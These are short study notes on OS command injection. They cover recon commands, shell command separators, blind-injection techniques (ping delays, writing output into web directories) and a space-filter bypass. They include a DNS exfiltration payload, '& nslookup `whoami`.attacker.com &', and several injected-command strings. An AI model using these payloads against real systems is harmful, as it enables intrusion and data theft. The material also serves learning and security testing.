OS Command INJ


Some commands:
---------------------------------------------------
Purpose of command 	    Linux 	        Windows
Name of current user 	whoami 	        whoami
Operating system 	    uname -a 	    ver
Network configuration 	ifconfig 	    ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes 	    ps -ef 	        tasklist 
....................................................


Try to change some params and get some errors. Maybe a os command is running backend. Try | to append new command or & to put concatenated command.

Blind OS:

Most of command inj are blind, you can try :

-Time delay on response with: & ping -c 10 127.0.0.1 &   (10 sec delay)  or input=x||ping+-c+10+127.0.0.1||

-Redirecting output to a dir that you can access, like : & whoami > /var/www/static/whoami.txt &  or /var/www/images/
Then see the output going to that file.
You can try to access directly, or save the file in the images and change a image request and find your file.

-Try nslookup:(proxy may have a whitelist for HTTP connection but might allow all DNS query)

This payload will do a nslookup to your domain and display the content of the command whoami:
& nslookup `whoami`.attacker.com & 


The following command separators work on both Windows and Unix-based systems:

    &
    &&
    |
    ||

The following command separators work only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    `
    injected command `
    $(
    injected command )



Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context 
(using " or ') before using suitable shell metacharacters to inject a new command. 

{IFS} is the decode for space in linux console. You can try to search for all .txt file with:
cat{IFS}*.txt if the space is not allowed.



